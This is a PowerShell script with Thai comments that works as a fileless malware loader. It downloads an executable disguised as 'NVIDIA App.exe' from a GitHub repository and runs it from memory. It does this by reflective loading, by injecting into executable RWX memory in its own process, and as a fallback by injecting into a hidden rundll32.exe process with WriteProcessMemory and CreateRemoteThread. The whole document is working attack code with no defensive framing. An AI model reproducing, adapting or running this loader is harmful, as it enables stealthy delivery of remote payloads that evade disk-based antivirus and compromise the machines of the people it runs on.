# ============================================
# Memory Execution + RunPE (สำรอง)
# รัน EXE จาก RAM โดยไม่เขียนไฟล์
# ============================================

# 1. ดาวน์โหลด EXE เป็น Byte Array
$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$wc.Proxy = $null
$bytes = $wc.DownloadData($exeUrl)

# ============================================
# 2. ฟังก์ชัน Memory Execution (วิธีที่ 1)
# ============================================
function Invoke-MemoryExecution {
    param([byte[]]$Bytes)
    
    # วิธีที่ 1: .NET Assembly (สำหรับ EXE ที่เป็น .NET)
    try {
        $assembly = [System.Reflection.Assembly]::Load($Bytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, (, [string[]] @()))
            return $true
        }
    } catch {}

    # วิธีที่ 2: Reflection Injection (สำหรับ EXE ทั่วไป)
    try {
        $ReflectiveInject = {
            param([byte[]]$PEBytes)
            
            $kernel32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
[DllImport("kernel32.dll")]
public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
'@ -Name "Kernel32" -Namespace "Win32" -PassThru

            $size = $PEBytes.Length
            $ptr = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
            
            if ($ptr -ne [IntPtr]::Zero) {
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $ptr, $size)
                $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                if ($thread -ne [IntPtr]::Zero) {
                    $kernel32::WaitForSingleObject($thread, 0xFFFFFFFF)
                    $kernel32::VirtualFree($ptr, 0, 0x8000)
                    return $true
                }
            }
            return $false
        }
        return & $ReflectiveInject $Bytes
    } catch {
        return $false
    }
}

# ============================================
# 3. ฟังก์ชัน RunPE (วิธีที่ 2 — สำรอง)
# ============================================
function Invoke-RunPE {
    param([byte[]]$PEBytes)
    
    try {
        # สร้าง Process ที่ Suspended
        $startupInfo = New-Object System.Diagnostics.ProcessStartInfo
        $startupInfo.FileName = "rundll32.exe"  # ใช้โปรเซสเปล่า
        $startupInfo.CreateNoWindow = $true
        $startupInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        
        $process = [System.Diagnostics.Process]::Start($startupInfo)
        $hProcess = $process.Handle
        
        # จัดสรรหน่วยความจำในโปรเซส
        $RunPE = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
'@ -Name "RunPE" -Namespace "Win32" -PassThru

        # จัดสรรหน่วยความจำ
        $size = $PEBytes.Length
        $ptr = $RunPE::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, 0x3000, 0x40)
        
        if ($ptr -eq [IntPtr]::Zero) {
            return $false
        }
        
        # เขียน EXE ลงหน่วยความจำ
        $bytesWritten = [IntPtr]::Zero
        $result = $RunPE::WriteProcessMemory($hProcess, $ptr, $PEBytes, $size, [ref] $bytesWritten)
        
        if (-not $result) {
            $RunPE::VirtualFreeEx($hProcess, $ptr, 0, 0x8000)
            return $false
        }
        
        # สร้างเธรดเพื่อรัน
        $thread = $RunPE::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        
        if ($thread -eq [IntPtr]::Zero) {
            $RunPE::VirtualFreeEx($hProcess, $ptr, 0, 0x8000)
            return $false
        }
        
        # คืนหน่วยความจำ
        $RunPE::VirtualFreeEx($hProcess, $ptr, 0, 0x8000)
        return $true
        
    } catch {
        return $false
    }
}

# ============================================
# 4. รัน EXE จาก RAM (ลองวิธีที่ 1 ก่อน)
# ============================================
if ($bytes -and $bytes.Length -gt 0) {
    # ลองวิธีที่ 1: Memory Execution
    $executed = Invoke-MemoryExecution -Bytes $bytes
    
    # ถ้าล้มเหลว ให้ใช้วิธีที่ 2: RunPE
    if (-not $executed) {
        Write-Host "⚠️ Memory Execution ล้มเหลว กำลังใช้ RunPE..."
        $executed = Invoke-RunPE -PEBytes $bytes
    }
    
    if ($executed) {
        Write-Host "✅ EXE รันจาก RAM สำเร็จ"
    } else {
        Write-Host "❌ EXE ไม่สามารถรันจาก RAM ได้ (ทั้ง 2 วิธี)"
    }
}
